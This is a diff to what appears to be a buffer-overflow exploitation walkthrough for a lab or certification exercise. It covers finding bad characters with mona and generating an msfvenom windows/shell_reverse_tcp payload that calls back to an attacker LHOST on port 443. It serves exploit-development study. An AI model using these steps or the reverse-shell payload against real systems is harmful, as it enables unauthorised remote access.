@@ -111,16 +111,26 @@ python exploit.py
 ```
 
 ```bash
-# repeat until Status = Unmodified: start app, exploit, generate a new byte array, compare to ESP
+# repeat the following until "Status = Unmodified": 
+#   start app
+#   send exploit
+#   generate a new byte array
+#   compare to ESP
+#   remove bad characters (look at the Comparison Results table, remove the characters underlined by "0a")
 
 # ESP     , BADCHARS
-# 0188FA30, "\x00\x11"
-# 019CFA30, "\x00\x11\x40"
-# 017FFA30, "\x00\x11\x40\x5f"
-# 01A4FA30, "\x00\x11\x40\x5f\xb8"
-# 0184FA30, "\x00\x11\x40\x5f\xb8\xee"
+# 0188FA30, "\x00\x??\x??\x??\x??"
 
 vim exploit.py # BADCHARS = "\x00\x??\x??\x??\x??"
+python exploit.py
+
+# output
+```
+
+```bash
+!mona compare -f c:\mona\oscp\bytearray.bin -a ???
+
+# output
 ```
 
 ## Find a JMP Instruction
@@ -136,12 +146,10 @@ vim exploit.py # BADCHARS = "\x00\x??\x??\x??\x??"
 ```
 
 ## Generate a Payload
-
-USE YOUR IP ADDRESS FOR THE LHOST!
 ```bash
 ip address
-LHOST=10.10.10.69 # change me
-BADCHARS="\x04\x03\x02\x01" # change me
+LHOST=10.10.10.69 # USE YOUR IP ADDRESS!
+BADCHARS="\x00\x??\x??\x??\x??" 
 msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b $BADCHARS
 
 # output
